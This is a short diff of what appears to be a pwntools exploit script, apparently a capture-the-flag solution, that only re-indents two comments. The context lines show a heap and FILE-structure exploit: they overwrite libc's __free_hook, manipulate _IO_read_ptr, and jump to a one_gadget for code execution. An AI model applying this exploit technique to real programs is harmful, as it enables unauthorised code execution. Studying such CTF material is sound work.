@@ -84,12 +84,12 @@ def main(host,port=2333):
 	
 	p.send(p64(0)*3+p64(libc.symbols["__free_hook"])+p64(libc.symbols["__free_hook"]+0x10))
     
-    # to make fp->_IO_read_ptr >= fp->_IO_read_end
+   	# to make fp->_IO_read_ptr >= fp->_IO_read_end
 	for i in range(0x28):
 		p.recvuntil("Buffer:")
 		p.sendline("")
 	
-    # now we can overwrite the free_hook
+   	# now we can overwrite the free_hook
 	pause()
 	onegadget = 0x4526a+libc.address
 	p.recvuntil("Size:")
